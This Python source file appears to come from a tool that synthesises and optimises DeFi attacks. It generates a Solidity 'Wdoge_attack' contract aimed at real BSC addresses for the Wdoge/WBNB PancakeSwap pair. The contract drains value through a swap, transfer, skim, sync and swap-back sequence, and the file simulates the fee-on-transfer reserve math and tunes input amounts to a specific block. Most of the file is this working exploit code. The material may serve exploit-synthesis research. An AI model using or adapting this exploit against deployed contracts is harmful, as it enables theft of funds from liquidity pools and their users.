import sys
import os
import itertools
import math
import builtins
import time
from black import out
from numpy import insert
import config

from scipy.interpolate import griddata, interp1d
import scipy.optimize as optimize
from scipy.interpolate import NearestNDInterpolator

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.append(os.path.dirname(SCRIPT_DIR))
from Actions.SingleApprox.SingleApprox import single_round_approx, predict
from Actions.Utils import *
from Actions.UtilsPrecision import *

class WdogeAction():    
    initialStates = [7102767, 78, 7102767, 78]
    globalStates = initialStates.copy()
    # globalStates[0]: Wdoge Reserve
    # globalStates[1]: Wbnb Reserve
    # globalStates[2]: Wdoge Balance
    # globalStates[3]: Wbnb Balance
    

    initialBalances = {"WBNB": 3000}
    currentBalances = initialBalances.copy()
    TokenPrices = {'WBNB': 1.0}
    TargetTokens = TokenPrices.keys()

    startStr_contract = '''// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "ds-test/test.sol";
import "./interfaces/WdogeI.sol";

contract Wdoge_attack {

    IWBNB  wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 busd  = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 wdoge  = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    IPancakePair wdoge_wbnb_pair = IPancakePair(wdoge_wbnb);

    string str1;
    string str2;
    string str3;
    string str4;

    string str89;
    string str90;
    string str91;
    string str92;
    string str93;

    uint112 WdogeReserve;
    uint112 WbnbReserve;
    uint WdogeInput;
    uint WBNBInput;
    uint WBNBIn;
    uint WdogeIn;

    constructor() payable public {
        require(msg.value == 3000 * 10 ** 18, "loan amount does not match");
        wbnb.deposit{value: 3000 * 10 ** 18}();
    }
    '''

    startStr_attack = '''
    function attack( $$_$$ ) public {
        '''

    endStr_attack = '''        revert(ProfitSummary());
    }
'''

    endStr_contract =  '''

    function ProfitSummary() public view returns (string memory) {
        return append("WBNB balance of attacker: ", uint2str(wbnb.balanceOf(address(this))/1e18));
    }

    function PancakePairSummary() public returns (string memory) {
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        uint WdogeBalance = wdoge.balanceOf(wdoge_wbnb);
        uint WbnbBalance = wbnb.balanceOf(wdoge_wbnb);
        str89 = append("Wdoge Reserve: ", uint2str(WdogeReserve / 1e24));
        str90 = append("Wbnb Reserve: ", uint2str(WbnbReserve / 1e18));
        str91 = append("Wdoge Balance: ", uint2str(WdogeBalance / 1e24));
        str92 = append("Wbnb Balance: ", uint2str(WbnbBalance / 1e18));
        return appendWithSpace(appendWithSpace(str89, str90), appendWithSpace(str91, str92));
    }


    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }


    function append(string memory a, string memory b) internal pure returns (string memory) {
        return string(abi.encodePacked(a, b));
    }

    function appendWithSpace(string memory a, string memory b) internal pure returns (string memory) {
        return append(a, append(" ", b));
    }


}

    
    '''


    @classmethod
    def resetBalances(cls):
        cls.currentBalances = cls.initialBalances.copy()
        cls.globalStates = cls.initialStates.copy()

    def calcProfit(stats):
        if stats == None or len(stats) != 1 or (len(stats) == 1 and stats[0] == 20):
            return 0
        profit = stats[0] - 3000
        return profit

    @classmethod
    def calcProfit2(cls):
        profit = 0
        for token in cls.currentBalances.keys():
            currentBalance = cls.currentBalances[token]
            earned = currentBalance
            if token in cls.initialBalances.keys():
                initialBalance = cls.initialBalances[token]
                earned -= initialBalance
            if token in cls.TokenPrices.keys():
                profit += earned * cls.TokenPrices[token]
        return profit


    @classmethod
    def buildAttackContract(cls, ActionList):
        start = cls.startStr_attack
        end = cls.endStr_attack
        return buildAttackContract(start, ActionList, end)

    @classmethod
    def buildCollectorContract(cls, ActionList):
        start = cls.startStr_attack
        end = '''
        }
        '''
        return buildCollectorContract(start, ActionList, end)

    def ToString(ActionList):
        return ToString(ActionList)
            
    @classmethod
    def string(cls):
        return cls.__name__
    


class SwapWBNB2Wdoge(WdogeAction):
    numInputs = 1
    tokensIn = ["WBNB"]
    tokensOut = ["Wdoge"]
    range = [0, 3000 ] # 2900

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        WBNBIn = $$ * 1e18;
        wbnb.transfer(wdoge_wbnb, WBNBIn);
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        WdogeInput = 997 * WBNBIn * WdogeReserve / (1000 * WbnbReserve + 997 * WBNBIn) * 100 / 104;
        wdoge_wbnb_pair.swap(WdogeInput, 0, address(this), ""); \n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances["WBNB"] -= input
        WdogeReserve = cls.globalStates[0]
        WbnbReserve = cls.globalStates[1]
        WdogeInput = 997 * input * WdogeReserve / (1000 * WbnbReserve + 997 * input) * 100 / 104

        cls.globalStates[0] -= WdogeInput * 104 / 100
        cls.globalStates[1] += input
        cls.globalStates[2] = cls.globalStates[0]
        cls.globalStates[3] = cls.globalStates[1]

        if "Wdoge" not in cls.currentBalances:
            cls.currentBalances["Wdoge"] = WdogeInput * 0.9
        else:
            cls.currentBalances["Wdoge"] += WdogeInput * 0.9



class TransferWdoge(WdogeAction):
    numInputs = 1
    tokensIn = ["Wdoge"]
    tokensOut = []
    range = [0, 6000000] # 5224718


    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        wdoge.transfer(wdoge_wbnb, $$ * 1e24   );\n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        cls.currentBalances["Wdoge"] -= input
        cls.globalStates[2] += input * 0.9


class PancakePairSkim(WdogeAction):
    # Action Specific Variables
    numInputs = 0
    tokensIn = []
    tokensOut = []
    range = [] 

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += "       wdoge_wbnb_pair.skim(address(this));\n"
        return action

    @classmethod
    def simulate(cls):
        transferAmount = cls.globalStates[2] - cls.globalStates[0]
        output0 = cls.globalStates[0] - (transferAmount * 0.04)
        output1 = 0.9 * transferAmount
        return output0, output1

    @classmethod
    def transit(cls):  # Assume input is a value
        output0, output1 = cls.simulate() 

        cls.globalStates[2] = output0
        if "Wdoge" not in cls.currentBalances:
            cls.currentBalances["Wdoge"] = output1
        else:
            cls.currentBalances["Wdoge"] += output1
        return



class PancakePairSync2(WdogeAction):
    numInputs = 0
    tokensIn = []
    tokensOut = []
    range = []

    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        wdoge_wbnb_pair.sync();\n'''
        return action

    @classmethod
    def transit(cls):  # Assume input is a value
        cls.globalStates[0] = cls.globalStates[2]
        cls.globalStates[1] = cls.globalStates[3]



class SwapWdoge2WBNB(WdogeAction):
    numInputs = 1
    tokensIn = ["Wdoge"]
    tokensOut = ["WBNB"]
    range = [0, 5000000 ] # 4466647


    @classmethod
    def actionStr(cls):
        action = "      // Action: " + cls.__name__ + "\n"
        action += '''        WdogeIn = $$ * 1e24;
        wdoge.transfer(wdoge_wbnb, WdogeIn);
        (WdogeReserve, WbnbReserve, ) = wdoge_wbnb_pair.getReserves();
        WdogeIn = WdogeIn * 9 /10;
        WBNBInput = 997 * WdogeIn * WbnbReserve / (1000 * WdogeReserve + 997 * WdogeIn);
        IPancakePair(wdoge_wbnb).swap(0, WBNBInput, address(this), "");\n'''
        return action


    @classmethod
    def transit(cls, input):  # Assume input is a value
        
        cls.currentBalances["Wdoge"] -= input * 104 / 100

        WdogeReserve = cls.globalStates[0]
        WbnbReserve = cls.globalStates[1]
        updatedinput = input * 0.9
        WBNBInput = 997 * updatedinput * WbnbReserve / (1000 * WdogeReserve + 997 * updatedinput)

        cls.currentBalances["WBNB"] += WBNBInput

        cls.globalStates[2] += updatedinput
        cls.globalStates[3] -= WBNBInput

        cls.globalStates[0] = cls.globalStates[2]
        cls.globalStates[1] = cls.globalStates[3]




def main():

    # config.method
    # config.contract_name 
    # config.initialEther 
    # config.blockNum
    # config.ETHorBSCorDVDorFantom

    config.method = 1
    config.ETHorBSCorDVDorFantom = 1
    config.initialEther = 3000
    config.blockNum = 17248706
    config.contract_name = "Wdoge_attack"

    
# Test for initial pass of data collecton: 

    action1 = SwapWBNB2Wdoge
    action2 = TransferWdoge
    action3 = PancakePairSkim
    action4 = PancakePairSync2
    action5 = SwapWdoge2WBNB
    action_list = [action1, action2, action3, action4, action5]
    initial_guess = [2900, 5224718, 4466647]

    ActionWrapper = WdogeAction

    # print("actual profit: ", getActualProfit(initial_guess, ActionWrapper, action_list))

    actual_profit = 78
    print("actual profit: ", actual_profit)
    estimate_profit = getEstimatedProfit_precise_display(initial_guess, ActionWrapper, action_list, True)
    print("estimated profit: ", estimate_profit)
    return actual_profit, estimate_profit




if __name__ == "__main__":
    main()
    